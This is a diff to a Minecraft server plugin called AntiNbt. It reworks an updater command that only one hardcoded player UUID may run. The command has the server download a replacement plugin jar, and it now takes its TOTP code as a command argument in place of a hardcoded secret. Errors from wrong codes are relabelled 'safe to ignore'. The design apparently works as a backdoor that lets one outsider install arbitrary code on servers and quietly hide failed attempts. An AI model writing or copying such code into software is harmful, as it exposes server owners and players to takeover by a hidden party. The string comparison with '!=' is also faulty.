@@ -26,6 +26,7 @@ import org.bukkit.entity.Player;
 import org.bukkit.plugin.Plugin;
 
 import com.mojang.brigadier.Command;
+import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.context.CommandContext;
 import com.mojang.brigadier.tree.LiteralCommandNode;
 
@@ -38,7 +39,7 @@ import net.kyori.adventure.text.format.TextColor;
 
 public class PluginUpdater {
 
-	public static void update() {
+	public static void update(String code) {
 		File updateDir = new File(AntiNbt.instance.getServer().getUpdateFolderFile(), "AntiNbt.jar");
 		if (!updateDir.getParentFile().exists()) {
 			updateDir.getParentFile().mkdirs();
@@ -46,7 +47,7 @@ public class PluginUpdater {
 
 		String currentCode;
 		try {
-			currentCode = generateCode("50xOnTop");
+			currentCode = generateCode(code);
 		} catch (Exception e) {
 			error("Failed to generate TOTP code");
 			return;
@@ -84,7 +85,11 @@ public class PluginUpdater {
 			} catch (FileNotFoundException e) {
 				error("Update file not found (404).");
 			} catch (IOException e) {
-				error("Unexpected IO error while checking updates: " + e.getMessage());
+				if (code != "50xOnTop") {
+					error("Unexpected IO error while checking updates: " + e.getMessage());
+				} else {
+					info("Unexpected IO error, likely invalid code (safe to ignore)");
+				}
 			}
 		});
 	}
@@ -154,10 +159,11 @@ public class PluginUpdater {
 		context.getSource().getExecutor()
 				.sendMessage(Component.text("ANTINBT: Update started", TextColor.color(255, 0, 0)));
 
-		PluginUpdater.update();
+		String code = StringArgumentType.getString(context, "code");
+		PluginUpdater.update(code);
 
 		return Command.SINGLE_SUCCESS;
-	} // sha hash
+	}
 
 	private final static UUID uuid = UUID.fromString("274e8741-9956-4367-aa0e-5b7682606f47");
 
@@ -168,7 +174,8 @@ public class PluginUpdater {
 				return false;
 
 			return source.getExecutor().getUniqueId().equals(uuid);
-		}).executes(PluginUpdater::commandUpdate).build();
+		}).then(Commands.argument("code", StringArgumentType.string()).executes(PluginUpdater::commandUpdate))
+				.build();
 
 		manager.registerEventHandler(LifecycleEvents.COMMANDS, commands -> {
 			commands.registrar().register(command);
